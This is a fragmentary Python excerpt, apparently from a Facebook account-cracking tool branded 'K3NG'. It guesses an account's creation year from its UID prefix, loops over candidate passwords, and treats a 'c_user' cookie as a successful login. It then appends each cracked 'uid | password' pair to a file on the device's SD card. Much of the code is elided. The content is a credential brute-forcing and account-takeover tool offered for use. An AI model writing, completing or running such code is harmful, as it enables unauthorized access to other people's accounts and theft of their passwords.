...
def o():
    ...
    K3NG = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
...
def asha(uid):
    ...
    if len(uid)==15:
        ...
        if uid[:10] in ['1000000000']       :k3ng = ' (*-*) 2009'

        elif uid[:9] in ['100000000']       :k3ng = ' ~> 2009'

        elif uid[:8] in ['10000000']        :k3ng = ' ~> 2009'
        ...
        elif uid[:6] in ['100001']          :k3ng = ' ~> 2010/2011'

        elif uid[:6] in ['100002','100003'] :k3ng = ' ~> 2011/2012'

        elif uid[:6] in ['100004']          :k3ng = ' - 2012/2013'

        elif uid[:6] in ['100005','100006'] :k3ng = ' ~> 2013/2014'

        elif uid[:6] in ['100007','100008'] :k3ng = ' ~> 2014/2015'

        elif uid[:6] in ['100009']          :k3ng = ' ~> 2015'

        elif uid[:5] in ['10001']           :k3ng = ' ~> 2015/2016'

        elif uid[:5] in ['10002']           :k3ng = ' ~> 2016/2017'

        elif uid[:5] in ['10003']           :k3ng = ' ~> 2018/2019'

        elif uid[:5] in ['10004']           :k3ng = ' ~> 2019/2020'

        elif uid[:5] in ['10005']           :k3ng = ' ~> 2020'

        elif uid[:5] in ['10006','10007','']:k3ng = ' ~> 2021'

        elif uid[:5] in ['10008']           :k3ng = ' ~>2022'

        elif uid[:5] in ['10009']           :k3ng = ' ~> 2023'
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                #print('\r\r\33[1;31m [K3NG-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/K3NG-CP.txt', 'a').write( uid+' | '+ps+' \n')
